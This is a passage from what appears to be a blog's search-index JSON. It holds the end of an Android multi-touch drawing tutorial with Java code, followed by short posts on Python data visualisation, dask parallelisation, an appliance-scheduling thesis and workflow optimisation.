( event . getX (), event . getY (), id )); lineMap . put ( id , createFinger ( event . getX (), event . getY (), id )); break ; } case MotionEvent . ACTION_MOVE : { int touchCounter = event . getPointerCount (); for ( int t = 0 ; t < touchCounter ; t ++ ) { int id = event . getPointerId ( t ); fingerMap . remove ( id ); lineMap . remove ( id ); fingerMap . put ( id , createCirPath ( event . getX ( t ), event . getY ( t ), id )); lineMap . put ( id , createFinger ( event . getX ( t ), event . getY ( t ), id )); } } case MotionEvent . ACTION_POINTER_DOWN : { int id = event . getPointerId ( getIndex ( event )); fingerMap . put ( id , createCirPath ( event . getX ( getIndex ( event )), event . getY ( getIndex ( event )), getIndex ( event ))); lineMap . put ( id , createFinger ( event . getX ( getIndex ( event )), event . getY ( getIndex ( event )), getIndex ( event ))); break ; } case MotionEvent . ACTION_POINTER_UP : { int id = event . getPointerId ( getIndex ( event )); fingerMap . remove ( id ); lineMap . remove ( id ); break ; } case MotionEvent . ACTION_UP : { int id = event . getPointerId ( 0 ); fingerMap . remove ( id ); lineMap . remove ( id ); break ; } } invalidate (); return true ; } private int getIndex ( MotionEvent event ) { return ( event . getAction () & MotionEvent . ACTION_POINTER_INDEX_MASK ) >> MotionEvent . ACTION_POINTER_INDEX_SHIFT ; } private Finger createFinger ( float x , float y , int id ) { return new Finger ( x , y , id ); } Now that we've created a new Finger class inside our TreeMap by the order that the screen is touched in and we're removing that class when the screen input has been released, we are now ready to draw on the screen from our inputs. By iterating through the TreeMap, in each loop we know what the previous and what the next value in the array we can draw a circle for where the input is and a line between. This also allows us to determine whereabouts is the point in between these two points so we can write text. For this example, I've chosen to write the length of the distance between the two inputs to demonstrate that this can also be dynamic in nature. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 private Path createCirPath ( float x , float y , int id ) { Path p = new Path (); p . addCircle ( x , y , 50 , Path . Direction . CW ); return p ; } @Override protected void onDraw ( Canvas canvas ) { for ( Integer key : fingerMap . keySet ()) { Path p = fingerMap . get ( key ); canvas . drawPath ( p , myPaint ); } if ( lineMap . size () > 1 ) { Integer key = lineMap . firstKey (); for ( int i = 0 ; i < lineMap . size (); i = i + 1 ) { Finger start_fin = lineMap . get ( key ); if ( key + 1 != lineMap . size ()) { Integer new_key = lineMap . higherKey ( key ); Finger end_fin = lineMap . get ( new_key ); canvas . drawLine ( start_fin . x_pos , start_fin . y_pos , end_fin . x_pos , end_fin . y_pos , myPaint ); String lineText = \"Length: \" + new DecimalFormat ( \"#.##\" ). format ( Math . sqrt ( Math . pow ( end_fin . x_pos - start_fin . x_pos , 2 ) + Math . pow ( end_fin . y_pos - start_fin . y_pos , 2 ))); canvas . drawText ( lineText ,(( start_fin . x_pos + end_fin . x_pos ) / 2 ), (( start_fin . y_pos + end_fin . y_pos ) / 2 ), textPaint ); key = new_key ; } } } } In summary, it is quite simple to develop multi-touch interactions between the user and the application to enhance usability and interactivity. This is part of a application that I am developing at the moment and hope to share more insights into development as I progress on.","tags":"Android","url":"https://jackmckew.dev/episode-5-android-multi-touch.html","loc":"https://jackmckew.dev/episode-5-android-multi-touch.html"},{"title":"Episode 4 - Visualization","text":"In an ever growing world of data, every person perceives data in their own personalized way. This calls for data analysis to be visualized in a clear straightforward way so that it is accessible by anyone may come into contact with the system. By further making the data analysis system interactive, this adds an extreme amount of personalization to the analysis. Allowing the user to interact with the data set in their own way. With the help of python, it was simple to create an interactive map from a data set containing geographic co-ordinates allowing users to visually determine where they would like to select their data set from. This can then be embedding into any web browser or mobile device allowing for extreme flexibility and interactivity.","tags":"Python","url":"https://jackmckew.dev/episode-4-visualization.html","loc":"https://jackmckew.dev/episode-4-visualization.html"},{"title":"Episode 3 - Open Mind","text":"While it always may seem to be easiest to keep using what you've always used in the past, sometimes it pays off to keep an open mind about how you approach problems. Recently was asked to create a database with minute interval data from 600-700 data recording stations for up to the past 60 years, truly a lot of a data to handle. My first pass over was to use the python pandas module, with great success, however iterating over the data sets took around a week. By looking out for new ways to tackle problems, I was able to increase the speed 450 times faster by using dask to parallelize my data frames and multiprocessing allowing multiple workers to work across many cores of the PC. This meant going from around 60,000 rows per second to 1.5 million rows/second and 18 workers at one time. For the next version I am planning to investigate how to utilize influxDB and Apache Spark/Hadoop to try and optimize this process further.","tags":"Python","url":"https://jackmckew.dev/episode-3-open-mind.html","loc":"https://jackmckew.dev/episode-3-open-mind.html"},{"title":"Episode 2 - Kew-It","text":"Yesterday, I submitted my Electrical Engineering honours thesis. My project consisted of creating a hardware/software solution to schedule appliances in home to minimize energy costs through time of use pricing. The hardware is a \"black box\" that monitors power usage of appliances and logs this data through Wi-Fi to a database hosted locally. The software utilized an multi-objective evolutionary algorithm to then determine what the most beneficial time for each of the appliances to run. By using python for these computations, directly when the results are determined, a control strategy sends control messages back out to the \"black boxes\" to control the appliances automatically. By scheduling appliances in this manner, showed up to 50% reduction in cost of energy daily. As this can be scaled to any size of implementation, this project could show significant savings in cost of energy for any building/business. The project has an estimated payback period of 5 months, comparable to that of solar with 4-5 years.","tags":"Engineering","url":"https://jackmckew.dev/episode-2-kew-it.html","loc":"https://jackmckew.dev/episode-2-kew-it.html"},{"title":"Episode 1 - Optimization","text":"Recently I had to opportunity to optimize some workflows that involved heavy data processing, before the users were completing calculations/statistics by hand on up to 10 million rows in Excel, causing many complications (and crashes). With the use of Python this data analysis has been reduced to a matter of seconds speeding up workflows in some cases down from a whole working day to a matter of seconds allowing users to work on more important tasks and almost eliminating risk of human error.","tags":"Python","url":"https://jackmckew.dev/episode-1-optimization.html","loc":"https://jackmckew.dev/episode-1-optimization.html"}]};